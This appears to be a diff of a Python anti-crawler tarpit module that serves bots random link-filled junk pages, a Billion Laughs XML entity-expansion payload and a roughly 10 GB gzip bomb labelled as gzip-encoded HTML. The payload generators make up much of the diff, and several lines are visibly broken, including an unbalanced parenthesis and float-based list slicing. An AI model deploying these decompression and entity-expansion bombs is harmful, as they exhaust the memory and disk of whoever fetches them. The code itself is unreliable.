@@ -8,14 +8,53 @@ from array import array
 import os
 oj = os.path.join
 
+class HeadWithBody:
+    dead = False
+    def __init__(self,b):
+        self.b = memoryview(b)
+        self.len = len(b)
+    def lose(self):
+        self.dead = True
+        self.b = None
+    def get(self,s,e):
+        if self.dead or s > self.len:
+            return None
+        return self.b[s:e]
+
+def joinheaders(headers):
+    return ('\r\n'.join(n+': '+v for n,v in headers)).encode('utf-8')
+
+class Maker:
+    headers = (
+        ('Content-Type','text/html; charset=utf-8'),
+        ('Server','Apache'),
+    )
+    
+    def __init__(self):
+        self.headers = list(self.headers)
+        random.shuffle(self.headers)
+        splitit = len(self.headers) / 2
+        self.prehead = b'HTTP/1.1 200 OK' + joinheaders(
+            self.headers[:splitit]+['Date',''])
+        self.posthead = joinheaders(self.headers[splitit:] + ['Content-Length',''])
+    def generate(self,date):
+        head = self.prehead + date.encode() + self.posthead
+        body = self.body()
+        return(
+            head + b'0\r\n\r\n',
+            HeadWithBody(head + str(len(body)).encode() + b'\r\n\r\n' + body))
+        
 def dorp(a):
     # should be printable, biased towards low, but above 32
     a.extend(
         chr(int(random.random()**3*10000+32)) \
         for i in range(random.randint(100,200)))
-    
-def billionLaughs(prefix):
-    return '''<?xml version="1.0" encoding="utf-8"?>
+
+class BillionLaughs(Maker):    
+    prefix = random.sample('lolzaoeuwhatatweest',4)).encode('utf-8')
+
+    def body(self):
+        return '''<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE {p}z [
  <!ENTITY {p} "{p}">
  <!ELEMENT {p}z (#PCDATA)>
@@ -29,117 +68,70 @@ def billionLaughs(prefix):
  <!ENTITY {p}8 "&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;">
  <!ENTITY {p}9 "&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;">
 ]>
-<{p}z>&{p}9;</{p}z>'''.format(p=prefix)
+<{p}z>&{p}9;</{p}z>'''.format(p=self.prefix).encode('utf-8')
 
-a = array('u')
-dorp(a)
-billionLaughs = billionLaughs(random.sample('lolzaoeuwhatatweest',4)).encode('utf-8')
-del a
 
-def zipbomb(prefix):
-    try:
-        with open(oj(filedb.top,'bomb.gz.bad'),'rb') as inp:
-            return inp.read()
-    except IOError: pass
-    stuff = bytes([0])*10000000
-    with replacerFile('bomb.gz.bad') as out:
-        g = gzip.GzipFile(mode='w',fileobj=out)
-        g.write(prefix)
-        for i in range(1000):
-            print('stripe',i)
-            g.write(stuff)
-        g.close()
-    # should end up 10mb -> 10 gigabyte
-zipbomb = zipbomb(billionLaughs) #meh, doesn't bother the bot.
+class ZipBomb(BillionLaughs):
+    headers = Maker.headers + (('Content-Encoding','gzip'),)
+    def body(self):
+        try:
+            with open(oj(filedb.top,'bomb.gz.bad'),'rb') as inp:
+                return inp.read()
+        except IOError: pass
+        
+        prefix = super().body()
+        stuff = bytes([0])*10000000
+        with replacerFile(oj(filedb.top,'bomb.gz.bad')) as out:
+            g = gzip.GzipFile(mode='w',fileobj=out)
+            g.write(prefix)
+            for i in range(1000):
+                print('stripe',i)
+                g.write(stuff)
+            g.close()
+        return self.body()
 
-def generateBody(a):
-    # arrayifying this shaves off a whole 3ms :p
-    a.extend('<!DOCTYPE html><html><head><title>')
-    dorp(a)
-    a.extend('''</title></head>'
-<body><p>''')
-    for link in range(random.randint(100,200)):
-        if random.randrange(0,2)==0:
-            a.extend("</p><p>")
-        if random.randrange(0,10)==0:
-            a.extend("<hr/>")
-        if random.randrange(0,6):
-            a.extend('\n')
-        a.extend('<a href="/art/')
+class Dorp(Maker):
+    def body(self):
+        a = array('u')
+        # arrayifying this shaves off a whole 3ms :p
+        a.extend('<!DOCTYPE html><html><head><title>')
         dorp(a)
-        a.extend('/secrets.html">')
-        dorp(a)
-        a.extend('</a>\n')
-    a.extend('</p></body></html>')
+        a.extend('''</title></head>'
+        <body><p>''')
+        for link in range(random.randint(100,200)):
+            if random.randrange(0,2)==0:
+                a.extend("</p><p>")
+            if random.randrange(0,10)==0:
+                a.extend("<hr/>")
+            if random.randrange(0,6):
+                a.extend('\n')
+            a.extend('<a href="/art/')
+            dorp(a)
+            a.extend('/secrets.html">')
+            dorp(a)
+            a.extend('</a>\n')
+        a.extend('</p></body></html>')
+        return a.tounicode().encode('utf-8')
 
-class HeadWithBody:
-    dead = False
-    def __init__(self,b):
-        self.b = memoryview(b)
-        self.len = len(b)
-    def lose(self):
-        self.dead = True
-        self.b = None
-    def get(self,s,e):
-        if self.dead or s > self.len:
-            return None
-        return self.b[s:e]
+dorp = Dorp()
+billionLaughs = BillionLaughs()
+zipbomb = ZipBomb()
     
-def thingy(name,head,body):
-    return (name,head + b'0\r\n\r\n',
-            HeadWithBody(
-                head + str(len(body)).encode() + b'\r\n\r\n' + \
-                body))
-
-def zbgen(date):
-    body = zipbomb
-    head = b'\r\n'.join((
-        b'HTTP/1.1 200 OK',
-        b'Content-Type: text/html; charset=utf-8',
-        b'Date: '+date.encode(),
-        b'Content-Encoding: gzip',
-        b'Server: Apache',
-        b'Content-Length: '
-    ))
-    return thingy('zipbomb',head,body)    
-    
-def dorpgen(date):
-    a = array('u')
-    generateBody(a)
-    body = a.tounicode().encode('utf-8')    
-    head = b'\r\n'.join((
-        b'HTTP/1.1 200 OK',
-        b'Content-Type: text/html; charset=utf-8',
-        b'Date: '+date.encode(),
-        b'Server: Apache',
-        b'Content-Length: '
-    ))
-    return thingy('dorp',head,body)
-
-def genbillionLaughs(date):
-    return thingy('billion laughs',
-        b'\r\n'.join((
-        b'HTTP/1.1 200 OK',
-        b'Content-Type: text/html; charset=utf-8',
-        b'Date: '+date.encode(),
-        b'Server: Apache',
-        b'Content-Length: '
-    )),billionLaughs)
-
 class BotHelper:
     lastBot = None
     messages = ()
     def select(self,date,ip):
         if self.lastBot is None or time.time() - self.lastBot < 100:
             for message in self.messages:
-                message[1].lose() # delayed senders can now give up here
-            self.messages = [dorpgen(date) for i in range(0x20)]
+                message[2].lose() # delayed senders can now give up here
+            self.messages = [dorp.generate(date) for i in range(0x20)]
             # self.messages = []
-            self.messages.append(genbillionLaughs(date))
-            self.messages.append(zbgen(date))
+            self.messages.append(billionLaughs.generate(date))
+            self.messages.append(zipbomb.generate(date))
             self.lastBot = time.time()
         return random.sample(self.messages,1)[0]
 
+makers = [Maker() for Maker in (Dorp,ZipBomb,BillionLaughs)]
 def stresstest():
     print('started at',time.time())
         
